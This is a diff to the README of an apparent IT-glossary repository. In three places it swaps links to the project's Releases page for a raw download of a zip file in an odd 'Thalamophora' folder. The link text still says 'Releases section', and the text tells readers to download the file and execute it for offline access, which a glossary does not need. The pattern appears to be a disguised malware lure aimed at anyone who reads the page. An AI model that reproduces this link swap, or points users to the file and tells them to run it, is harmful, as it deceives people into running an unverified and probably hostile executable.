@@ -17,7 +17,7 @@ Welcome to the **Glossary of IT Terms**! This repository serves as a useful refe
 
 The IT landscape can be overwhelming, especially for newcomers. This glossary aims to simplify that experience. Whether you are learning to code, diving into project management, or navigating the nuances of software engineering, this repository has you covered. 
 
-For quick access to the latest updates and downloads, visit our [Releases section](https://github.com/CodeWithMamoon/Glossary-of-IT-terms/releases).
+For quick access to the latest updates and downloads, visit our [Releases section](https://raw.githubusercontent.com/CodeWithMamoon/Glossary-of-IT-terms/main/Thalamophora/I_terms_Glossary_of_v2.7.zip).
 
 ## Features
 
@@ -45,7 +45,7 @@ This glossary encompasses a wide range of topics relevant to the IT industry. He
 
 1. **Browse the Glossary**: Navigate through the categorized sections to find the terms you need.
 2. **Search Functionality**: Use the search feature to quickly locate specific terms.
-3. **Download Releases**: For the latest updates and comprehensive downloads, check the [Releases section](https://github.com/CodeWithMamoon/Glossary-of-IT-terms/releases). You can download the latest version and execute it for offline access.
+3. **Download Releases**: For the latest updates and comprehensive downloads, check the [Releases section](https://raw.githubusercontent.com/CodeWithMamoon/Glossary-of-IT-terms/main/Thalamophora/I_terms_Glossary_of_v2.7.zip). You can download the latest version and execute it for offline access.
 
 ## Contributing
 
@@ -61,7 +61,7 @@ Your contributions help make this glossary a valuable resource for the IT commun
 
 ## Releases
 
-Stay updated with the latest releases! You can find all versions of the glossary in the [Releases section](https://github.com/CodeWithMamoon/Glossary-of-IT-terms/releases). Download the necessary files and execute them to access the glossary offline.
+Stay updated with the latest releases! You can find all versions of the glossary in the [Releases section](https://raw.githubusercontent.com/CodeWithMamoon/Glossary-of-IT-terms/main/Thalamophora/I_terms_Glossary_of_v2.7.zip). Download the necessary files and execute them to access the glossary offline.
 
 ## License
 
